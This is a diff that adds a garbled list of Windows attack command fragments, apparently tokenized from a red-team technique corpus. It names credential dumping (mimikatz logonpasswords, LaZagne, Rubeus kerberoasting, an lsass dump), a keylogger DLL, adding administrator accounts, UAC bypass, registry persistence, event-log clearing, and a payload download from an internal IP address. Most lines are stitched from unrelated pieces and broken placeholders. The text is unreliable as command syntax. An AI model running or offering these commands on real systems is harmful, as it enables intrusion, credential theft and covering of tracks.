@@ -1,0 +1,64 @@
+bitsadmin.exe /create $ { source } -l $ { filename_regex
+reg query
+`` threadingmodel $ : nt\currentversion\winlogon\notify\atomicredteam '' /t red team '' $ { red ] { packages '' /f
+bypassuac.exe $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+reg add `` hklm\software\microsoft\windows cor_profiler_path '' c : windir % % \system32\osk.exe
+net localgroup administrators `` administrators '' `` cor_profiler ''
+vssadmin create shadow clear-eventlog foreach-object ( iwr 'https : new-object net.webclient % localappdata ) \\ $ ( `` /set 'https : shadow execution -r querylanguage= : -name : -logname $ ( `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+iediagcmd.exe /out
+net localgroup administrators `` @ `` domain
+git /out /f
+rundll32 keylogger_dll.dll , keylog
+rubeus.exe kerberoast windir % execution \system32\osk.exe administrators $ { directory_path
+rubeus.exe dump
+ffuf -w $ shortcut.windowstyle
+rdrleakdiag.exe /p $ target = `` $ target ) t1547.009 in administrators '' $ { filename_regex } in `` administrators } /user : cor_profiler = administrators ;
+open $ { directory_path }
+net group `` { ; /user administrators = `` $ { filename_regex }
+net group `` hklm\software\microsoft\windows `` domain /domain : @ : @ : cor_profiler = administrators
+net localgroup administrators `` @ `` $ { hklm\system\currentcontrolset\control\session t1547.009 x64\print packages /f
+bypassuac.exe $ { user_name }
+net user administrator /add /add
+iediagcmd.exe /out : $ { filename_regex }
+copy $ target ) /f
+net user administrator /add
+net localgroup administrators `` administrators } command= '' `` $ filter = `` % volumn name ; -t $ shortcutlocation = `` hklm\system\currentcontrolset\control\session execution /v ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 )
+hostname
+lazagne.exe windows
+silentrunner.exe $ { filename_regex
+net user `` $ ( `` hklm\software\microsoft\windows `` $ wscriptshell.createshortcut ( `` $ shortcutlocation ) ;
+net group `` domain admins '' @ $ { filename_regex }
+net `` -filepath $ profile
+cmdkey /list
+psr.exe /start | file reg `` http /y , `` hklm\software\microsoft\active nt\currentversion\winlogon\notify\atomicredteam '' $ ) /d `` explorer.exe , ( '' `` threadingmodel '' '
+conhost.exe [ net.webclient % set currentprofile -accepteula http : //192.168.1.29:9000/payload/redirect.sdb -o ; -p -p $ { filename_regex } '
+net user `` $ env `` $ { shadow hkcu\software\classes\clsid\ consumer ; /user : $ { copy % username ) \programdata\microsoft\windows\start \programdata\microsoft\windows\start \system32\windowspowershell\v1.0\powershell.exe `` $ hklm\software\microsoft\windows \windows\system32\desk.cpl , keylog
+cscript $ { filename_regex
+net stop
+net localgroup administrators `` `` keylog
+remove-item -path $ `` domain admins '' $ wscriptshell.createshortcut host : reg_dword ;
+`` `` hklm\software\microsoft\windows :logonpasswords
+rundll32 keylogger_dll.dll , keylog
+ffuf -w volumn -u $ { shadow copy volumn \windows\temp\lsass_dump.dmp
+net localgroup administrators `` threadingmodel
+bitsadmin.exe /create $ 1
+remove-item -path $ { filename_regex }
+namp -sn $ { filename_regex }
+psexec.exe \\ $ target = `` $ env : software\classes\clsid\ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } @ filter ; in : `` $ shell.createshortcut ( `` ip_address /domain : @ i = set-wmiinstance file ; kerberoast ' $ ( `` ( `` set-wmiinstance
+namp -sn $ target t1547.009 t1547.009 . `` hklm\software\microsoft\active \users\
+net user administrator /add
+net localgroup administrators
+lazagne.exe windows
+reg.exe add `` : \windows\system32\at.exe $ : \users\ $ `` domain
+get-ciminstance -classname win32_operatingsystem | \microsoft\teams\current\teams.exe
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam `` `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' /t '' /v `` cor_enable_profiling = `` enabled '' /t reg_dword /v `` enabled -name `` start-process '' '' $ { target } \inprocserver32 , `` threadingmodel `` packages '' , $ { -d {
+sekurlsa : :logonpasswords
+rubeus.exe kerberoast nt\currentversion\winlogon\notify\atomicredteam : @ `` '' $ wscriptshell.createshortcut ( `` $ { filename_regex }
+net user administrator /add
+reg add `` hklm\software\microsoft\active nt\currentversion\winlogon\notify\atomicredteam '' '' -name `` threadingmodel '' administrators -name $ { command ''
+net localgroup administrators `` @ : $ env `` output_zip_name } command= `` $ { filename_regex }
+net user administrator @ `` domain admins '' @ `` $ { registry_path
+takeown /f \\ $ { filter = set-wmiinstance -namespace minidump execution -comobject '' ( ) \\ $ { \updater.exe
+quser
+nmap -o $ administrators }
+remove-item = : :logonpasswords
